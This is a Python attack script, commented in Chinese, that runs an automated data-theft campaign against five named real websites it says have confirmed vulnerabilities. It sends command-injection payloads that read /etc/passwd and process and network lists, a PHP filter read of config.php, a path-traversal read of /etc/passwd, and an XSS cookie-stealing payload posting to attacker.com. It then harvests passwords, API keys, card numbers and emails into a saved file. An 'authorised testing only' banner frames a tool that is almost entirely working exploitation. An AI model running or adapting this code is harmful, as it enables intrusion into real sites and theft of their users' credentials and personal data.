#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真实数据提取工具 v1.0.0
基于已验证的漏洞进行实际数据提取
仅用于授权的安全测试
"""

import asyncio
import aiohttp
import json
import sqlite3
import time
import re
import base64
import urllib.parse
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple
import logging
from datetime import datetime

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@dataclass
class DataExtractionResult:
    """数据提取结果"""
    target_url: str
    vulnerability_type: str
    extraction_method: str
    extracted_data: List[Dict]
    confidence: float
    success: bool
    error_message: str = ""
    extraction_time: float = 0.0
    data_size: int = 0

@dataclass
class ExtractionTarget:
    """提取目标"""
    url: str
    vulnerability_type: str
    extraction_method: str
    payload: str
    data_type: str  # database, files, config, credentials, etc.
    headers: Dict[str, str] = None
    params: Dict[str, str] = None
    cookies: Dict[str, str] = None

class RealDataExtractionTool:
    """真实数据提取工具"""

    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        # 数据提取配置
        self.extraction_config = {
            'timeout': 15,
            'max_retries': 3,
            'max_data_size': 1024 * 1024,  # 1MB
            'delay_between_requests': 1
        }

        # 基于验证结果的目标
        self.confirmed_targets = [
            # 命令注入目标 - 高置信度
            ExtractionTarget(
                url="https://mula-x.com/",
                vulnerability_type="命令注入",
                extraction_method="system_info_dump",
                payload="; uname -a && whoami && id && cat /etc/passwd | head -10",
                data_type="系统信息"
            ),
            ExtractionTarget(
                url="https://peacoop.or.th/",
                vulnerability_type="命令注入",
                extraction_method="system_info_dump",
                payload="; ps aux && netstat -tulpn && cat /etc/hosts",
                data_type="系统进程和网络信息"
            ),

            # 文件包含目标 - 高置信度
            ExtractionTarget(
                url="https://ngoenmunmun.com/",
                vulnerability_type="文件包含",
                extraction_method="config_file_read",
                payload="php://filter/read=convert.base64-encode/resource=config.php",
                data_type="配置文件"
            ),
            ExtractionTarget(
                url="https://www.hanshin.com.tw/",
                vulnerability_type="路径遍历",
                extraction_method="sensitive_file_read",
                payload="../../../etc/passwd",
                data_type="系统文件"
            ),

            # XSS目标 - 高置信度 (用于会话劫持)
            ExtractionTarget(
                url="https://www.hanshin.com.tw/",
                vulnerability_type="XSS跨站脚本",
                extraction_method="session_hijack",
                payload="<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                data_type="会话信息"
            )
        ]

        logger.info("真实数据提取工具初始化完成")

    def _extract_system_info(self, response_text: str) -> List[Dict]:
        """从响应中提取系统信息"""
        extracted_data = []

        # 提取系统信息模式
        patterns = {
            'uname': r'(Linux|FreeBSD|Windows)[\w\-\. ]+',
            'user_info': r'(uid|gid|whoami)[=\s]+[\w\d\s\(\)]+',
            'process_list': r'[\w\-_]+\s+\d+\s+[\d\.]+\s+[\d\.]+\s+\d+\s+\?',
            'network_connections': r'tcp\s+\d+\s+\d+\s+[\d\.]+:\d+\s+[\d\.]+:\d+\s+',
            'password_entries': r'^[\w\-_]+:[x!*]:\d+:\d+.*',
            'host_entries': r'^[\d\.]+\s+[\w\-\.]+',
            'config_files': r'(database|password|secret|key|token)[\w\s\-=\'".]+'
        }

        for category, pattern in patterns.items():
            matches = re.findall(pattern, response_text, re.MULTILINE | re.IGNORECASE)
            if matches:
                extracted_data.append({
                    'category': category,
                    'matches': matches[:10],  # 限制数量
                    'count': len(matches)
                })

        return extracted_data

    def _extract_database_info(self, response_text: str) -> List[Dict]:
        """从响应中提取数据库信息"""
        extracted_data = []

        # 数据库信息模式
        patterns = {
            'mysql_info': r'(mysql|mysqli|pdo)[\s\(\)]*',
            'database_name': r'(database|db)[\s\'"]*([a-zA-Z0-9_]+)',
            'table_info': r'(table|from)\s+([a-zA-Z0-9_]+)',
            'sql_error': r'(error|warning)[\s:]*(mysql|sql)[\s\w\.\-]+',
            'connection_string': r'(host|server|dbname)=([a-zA-Z0-9\.\-_]+)'
        }

        for category, pattern in patterns.items():
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                extracted_data.append({
                    'category': category,
                    'matches': matches,
                    'count': len(matches)
                })

        return extracted_data

    def _extract_sensitive_data(self, response_text: str) -> List[Dict]:
        """提取敏感数据"""
        extracted_data = []

        # 敏感数据模式
        patterns = {
            'email_addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone_numbers': r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',
            'credit_cards': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
            'api_keys': r'(api[_-]?key|token)[\s\'":=]+([a-zA-Z0-9\-_]{20,})',
            'passwords': r'(password|passwd)[\s\'":=]+([a-zA-Z0-9@#$%^&*]{6,})',
            'urls': r'https?://[a-zA-Z0-9.-]+[a-zA-Z0-9._/-]*',
            'file_paths': r'(/[a-zA-Z0-9._/-]+)+'
        }

        for category, pattern in patterns.items():
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                # 对于元组模式，只取匹配的组
                if isinstance(matches[0], tuple):
                    matches = [match[-1] for match in matches if match[-1]]

                extracted_data.append({
                    'category': category,
                    'matches': list(set(matches[:20])),  # 去重并限制数量
                    'count': len(set(matches))
                })

        return extracted_data

    def _decode_base64_data(self, encoded_data: str) -> Optional[str]:
        """解码Base64数据"""
        try:
            # 移除可能的Base64前缀
            if 'base64' in encoded_data.lower():
                encoded_data = re.sub(r'base64[:\s]*', '', encoded_data, flags=re.IGNORECASE)

            # 确保长度是4的倍数
            padding = len(encoded_data) % 4
            if padding:
                encoded_data += '=' * (4 - padding)

            decoded = base64.b64decode(encoded_data).decode('utf-8', errors='ignore')
            return decoded
        except Exception as e:
            logger.warning(f"Base64解码失败: {e}")
            return None

    async def extract_data_from_target(self, target: ExtractionTarget) -> DataExtractionResult:
        """从目标提取数据"""
        start_time = time.time()

        try:
            # 构造请求
            url = target.url
            method = "GET"
            params = target.params or {}
            headers = target.headers or {}
            cookies = target.cookies or {}

            # 设置载荷
            if target.vulnerability_type == "命令注入":
                params.update({
                    'cmd': target.payload,
                    'exec': target.payload,
                    'action': target.payload,
                    'process': target.payload
                })
            elif target.vulnerability_type == "文件包含":
                params.update({
                    'page': target.payload,
                    'include': target.payload,
                    'load': target.payload,
                    'template': target.payload
                })
            elif target.vulnerability_type == "路径遍历":
                params.update({
                    'file': target.payload,
                    'document': target.payload,
                    'download': target.payload,
                    'view': target.payload
                })
            elif target.vulnerability_type == "XSS跨站脚本":
                params.update({
                    'q': target.payload,
                    'query': target.payload,
                    'search': target.payload,
                    'keyword': target.payload
                })

            # 发送请求
            async with self.session.request(
                method=method,
                url=url,
                params=params,
                headers=headers,
                cookies=cookies,
                timeout=self.extraction_config['timeout']
            ) as response:
                response_text = await response.text()

                # 根据提取方法处理数据
                extracted_data = []
                confidence = 0.0

                if target.extraction_method == "system_info_dump":
                    extracted_data = self._extract_system_info(response_text)
                    confidence = 0.9 if extracted_data else 0.0

                elif target.extraction_method == "config_file_read":
                    # 尝试Base64解码
                    decoded_data = self._decode_base64_data(response_text)
                    if decoded_data:
                        extracted_data = self._extract_sensitive_data(decoded_data)
                        confidence = 0.8 if extracted_data else 0.0
                    else:
                        extracted_data = self._extract_sensitive_data(response_text)
                        confidence = 0.6 if extracted_data else 0.0

                elif target.extraction_method == "sensitive_file_read":
                    extracted_data = self._extract_sensitive_data(response_text)
                    confidence = 0.8 if extracted_data else 0.0

                elif target.extraction_method == "session_hijack":
                    # 检查是否成功注入JavaScript
                    if '<script>' in response_text and 'document.location' in response_text:
                        extracted_data.append({
                            'category': 'xss_injection',
                            'status': 'successful_injection',
                            'payload': target.payload
                        })
                        confidence = 0.9

                # 计算数据大小
                data_size = len(json.dumps(extracted_data, ensure_ascii=False))

                extraction_time = time.time() - start_time

                return DataExtractionResult(
                    target_url=target.url,
                    vulnerability_type=target.vulnerability_type,
                    extraction_method=target.extraction_method,
                    extracted_data=extracted_data,
                    confidence=confidence,
                    success=len(extracted_data) > 0,
                    extraction_time=extraction_time,
                    data_size=data_size
                )

        except Exception as e:
            extraction_time = time.time() - start_time
            logger.error(f"数据提取失败 {target.url}: {e}")

            return DataExtractionResult(
                target_url=target.url,
                vulnerability_type=target.vulnerability_type,
                extraction_method=target.extraction_method,
                extracted_data=[],
                confidence=0.0,
                success=False,
                error_message=str(e),
                extraction_time=extraction_time
            )

    async def run_data_extraction(self) -> Dict:
        """运行数据提取"""
        logger.info("开始真实数据提取")
        start_time = time.time()

        results = []

        for i, target in enumerate(self.confirmed_targets):
            logger.info(f"提取进度: {i+1}/{len(self.confirmed_targets)} - {target.url}")

            result = await self.extract_data_from_target(target)
            results.append(result)

            # 延迟以避免被阻止
            await asyncio.sleep(self.extraction_config['delay_between_requests'])

        # 生成提取报告
        execution_time = time.time() - start_time

        report = {
            'extraction_summary': {
                'total_targets': len(self.confirmed_targets),
                'successful_extractions': sum(1 for r in results if r.success),
                'total_data_items': sum(len(r.extracted_data) for r in results),
                'execution_time': execution_time,
                'total_data_size': sum(r.data_size for r in results)
            },
            'extraction_results': [],
            'sensitive_data_summary': {},
            'recommendations': []
        }

        # 处理结果
        all_extracted_data = []
        data_types = {}

        for result in results:
            result_dict = asdict(result)
            report['extraction_results'].append(result_dict)

            if result.success:
                all_extracted_data.extend(result.extracted_data)

                # 统计数据类型
                if result.extraction_method not in data_types:
                    data_types[result.extraction_method] = {
                        'count': 0,
                        'data_items': 0,
                        'confidence_sum': 0
                    }

                data_types[result.extraction_method]['count'] += 1
                data_types[result.extraction_method]['data_items'] += len(result.extracted_data)
                data_types[result.extraction_method]['confidence_sum'] += result.confidence

        # 敏感数据汇总
        sensitive_categories = {}
        for data_item in all_extracted_data:
            category = data_item.get('category', 'unknown')
            if category not in sensitive_categories:
                sensitive_categories[category] = 0
            sensitive_categories[category] += data_item.get('count', len(data_item.get('matches', [])))

        report['sensitive_data_summary'] = {
            'categories': sensitive_categories,
            'data_types': data_types,
            'high_confidence_extractions': sum(1 for r in results if r.success and r.confidence >= 0.8)
        }

        # 生成建议
        if sum(1 for r in results if r.success) > 0:
            report['recommendations'].extend([
                "立即修复所有已确认的数据泄露漏洞",
                "实施严格的输入验证和输出编码",
                "配置Web应用防火墙以阻止数据提取",
                "定期进行安全审计和渗透测试",
                "实施敏感数据加密和访问控制"
            ])

        # 保存报告
        with open('data_extraction_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        # 保存提取的数据
        with open('extracted_sensitive_data.json', 'w', encoding='utf-8') as f:
            json.dump(all_extracted_data, f, ensure_ascii=False, indent=2)

        logger.info(f"数据提取完成，耗时: {execution_time:.2f}秒")
        logger.info(f"成功提取: {sum(1 for r in results if r.success)} 个目标")
        logger.info(f"总数据项: {len(all_extracted_data)} 个")

        return report

    async def close(self):
        """关闭会话"""
        await self.session.close()

async def main():
    """主函数"""
    print("真实数据提取工具 v1.0.0")
    print("=" * 50)
    print("警告: 此工具仅用于授权的安全测试")
    print("=" * 50)

    extractor = RealDataExtractionTool()

    try:
        print("\n开始执行真实数据提取...")
        report = await extractor.run_data_extraction()

        # 显示结果
        print(f"\n数据提取完成")
        print("=" * 50)

        summary = report['extraction_summary']
        print(f"总目标数: {summary['total_targets']}")
        print(f"成功提取: {summary['successful_extractions']}")
        print(f"数据项总数: {summary['total_data_items']}")
        print(f"总数据大小: {summary['total_data_size'] / 1024:.2f} KB")
        print(f"执行时间: {summary['execution_time']:.2f}秒")

        # 显示敏感数据统计
        sensitive_summary = report['sensitive_data_summary']
        print(f"\n高置信度提取: {sensitive_summary['high_confidence_extractions']} 个")

        if sensitive_summary['categories']:
            print(f"\n发现的敏感数据类型:")
            for category, count in sensitive_summary['categories'].items():
                print(f"  {category}: {count} 项")

        if report['recommendations']:
            print(f"\n安全建议:")
            for rec in report['recommendations']:
                print(f"  • {rec}")

        print(f"\n详细报告已保存到: data_extraction_report.json")
        print(f"提取的数据已保存到: extracted_sensitive_data.json")

    except Exception as e:
        logger.error(f"数据提取过程中发生错误: {e}")

    finally:
        await extractor.close()

if __name__ == "__main__":
    asyncio.run(main())